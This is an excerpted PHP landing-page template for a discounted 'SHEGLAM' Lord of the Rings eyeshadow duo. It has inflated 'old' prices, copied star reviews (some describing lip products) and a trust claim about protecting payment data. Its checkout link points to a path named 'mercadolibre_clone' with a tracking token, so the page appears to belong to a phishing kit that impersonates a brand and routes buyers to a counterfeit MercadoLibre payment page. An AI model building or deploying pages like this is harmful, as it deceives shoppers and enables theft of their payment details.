...
$landing_slug  = 'sheglam-lotr-eyeshadow';
$landing_token = obtenerOCrearTokenLanding($landing_slug, "THE LORD OF THE RINGS | SHEGLAM Forces Of Fate | Eyeshadow Duo", 15658);
$precio_num    = 15658;
$precio_fmt    = '15.658';
...
<head>
    ...
    <title><?= htmlspecialchars("THE LORD OF THE RINGS | SHEGLAM Forces Of Fate | Eyeshadow Duo") ?></title>
...
<body class="<?= $es_modo_edicion ? 'modo-edicion-activo' : '' ?>" style="<?= $es_modo_edicion ? 'margin-top: 50px;' : '' ?>">
    ...
    <div class="category-switcher">
        <a href="#cat1" class="category-pill active" data-editable="true">SHEGLAM COSMETICS</a>
        <a href="#cat2" class="category-pill inactive" data-editable="true">SHEGLAM HAIR</a>
    </div>
    ...
    <nav class="navbar">
        ...
        <div class="nav-center-logo">
            <?php if (file_exists(__DIR__ . '/logo.svg')): ?>
                <img src="logo.svg" class="brand-logo-img" alt="<?= htmlspecialchars("SHEGLAM") ?>">
            <?php elseif (file_exists(__DIR__ . '/logo.png')): ?>
                <img src="logo.png" class="brand-logo-img" alt="<?= htmlspecialchars("SHEGLAM") ?>">
            <?php else: ?>
                <span class="brand-logo-text" data-editable="true"><?= htmlspecialchars("SHEGLAM") ?></span>
            <?php endif; ?>
        </div>
        ...
        <div class="product-grid-layout">
            ...
            <section class="gallery-wrapper-desktop">
                <div class="main-image-wrap" onclick="abrirLightbox(activeImgIndex)" title="Haz clic para ampliar">
                    ...
                    <img id="mainImage" src="img/img_1.jpg" alt="<?= htmlspecialchars("THE LORD OF THE RINGS | SHEGLAM Forces Of Fate | Eyeshadow Duo") ?>">
            ...
            <section class="product-info">
                <h1 class="product-title" data-editable="true"><?= htmlspecialchars("THE LORD OF THE RINGS | SHEGLAM Forces Of Fate | Eyeshadow Duo") ?></h1>

                <div class="rating-row">
                    <div class="stars-container">★★★★★</div>
                    <span class="reviews-count" data-editable="true">(7)</span>
                </div>

                <div class="price-row">
                    <span class="current-price" data-editable="true">$ 15.658</span>
                    <span class="old-price" data-editable="true">$ 28.900</span>
                    <span class="discount-pill" data-editable="true">-46% OFF</span>
                </div>

                <div class="variant-block">
                    <div class="variant-header">
                        <div class="variant-label">Color / Variante: <span id="colorNameDisplay" data-editable="true"><?= htmlspecialchars("Loyalty & Courage") ?></span></div>
                    </div>
                ...
                <div class="size-block">
                    ...
                    <div class="size-pills-row">
                        <button class="size-pill" data-editable="true"><?= htmlspecialchars("4.2g") ?></button>
                    </div>
                </div>
                ...
                <div class="accordion-item">
                    ...
                    <div class="accordion-body open">
                        <p data-editable="true">Dúo de sombras de ojos altamente pigmentadas con textura sedosa, acabado brillante y mate de larga duración inspirada en el Señor de los Anillos. Diseñado para un look cautivador durante todo el día.</p>
                    </div>
                </div>
                ...
                <div class="secure-trust-box">
                    ...
                    <ul class="secure-trust-list">
                        ...
                        <li><span class="check-icon">✓</span> <span data-editable="true"><?= htmlspecialchars("SHEGLAM") ?> comparte información de pago únicamente con proveedores de pago confiables comprometidos con proteger tus datos.</span></li>
                    </ul>
                </div>
            </section>
    ...
    <div class="ml-promo-banner-wrap" onclick="window.location.href='<?= URL_PASARELA ?>/pago/mercadolibre_clone/index.php?token=<?= $landing_token ?>'">
        <div class="ml-banner-inner">
            ...
            <div class="ml-banner-center">
                <span class="ml-brand-name"><?= htmlspecialchars("SHEGLAM") ?></span>
                <span class="ml-product-name"><?= htmlspecialchars("THE LORD OF THE RINGS | SHEGLAM Forces Of Fate | Eyeshadow Duo") ?></span>
            ...
            <div class="filters-left-group">
                ...
                <div class="review-filter-pill">
                    ...
                    <select class="filter-select-box" id="filterColor" onchange="renderReviews()">
                        <option value="All">All</option>
                        <option value="<?= htmlspecialchars("Loyalty & Courage") ?>"><?= htmlspecialchars("Loyalty & Courage") ?></option>
                    </select>
                </div>
                <div class="review-filter-pill">
                    <span>Rating</span>
    ...
    <footer class="generic-footer">
        ...
        <div class="footer-bottom-generic">
            <div>© <?= date('Y') ?> <span data-editable="true"><?= htmlspecialchars("SHEGLAM") ?></span>. Todos los derechos reservados.</div>
    ...
    <div class="cart-overlay" id="cartOverlay" onclick="if(event.target===this) toggleCart()">
        <div class="cart-drawer">
            ...
            <div class="cart-footer">
                <div class="cart-summary-row"><span>Subtotal</span><span id="cartSubtotal">$ 15.658</span></div>
                <div class="cart-summary-row"><span>Envío</span><span style="color:#059669; font-weight:700;">GRATIS</span></div>
                <div class="cart-summary-row total"><span>Total</span><span id="cartTotal">$ 15.658</span></div>
    ...
    <script>
        ...
        const SWATCHES = ["#d89f82","#e6c589","#dfc6cf"];
        const REVIEWS_LIST = [{"author":"S***h","color":"Loyalty & Courage","size":"4.2g","stars":"★★★★★","comment":"Jelly Wow Hydrating Lip Oil-Green Apple Envy & Forces of Fate Duo","date":"2024.06.02"},{"author":"s***m","color":"Loyalty & Courage","size":"4.2g","stars":"★★★★★","comment":"Very nice leaves a nice gloss and high pigmentation","date":"2024.07.02"},{"author":"j***5","color":"Loyalty & Courage","size":"4.2g","stars":"★★★★★","comment":"Very nice","date":"2024.06.25"},{"author":"T***m","color":"Loyalty & Courage","size":"4.2g","stars":"★★★★★","comment":"I really enjoyed using them, they smell great and last a long time.","date":"2025.12.26"},{"author":"B***i","color":"Loyalty & Courage","size":"4.2g","stars":"★★★★★","comment":"very nice lip gloss and lasts for long for soft lips, sheglam is always the best","date":"2025.12.17"}];
        const PRECIO_UNITARIO = 15658;
        const PRODUCTO_TITULO = "THE LORD OF THE RINGS | SHEGLAM Forces Of Fate | Eyeshadow Duo";
        const LANDING_TOKEN = "864580eee29e4d46d69c2b2948c7e3cc";
        const LANDING_SLUG = "sheglam-lotr-eyeshadow";
        ...
        let cartState = { qty: 1, variant: "Loyalty & Courage", size: "4.2g" };
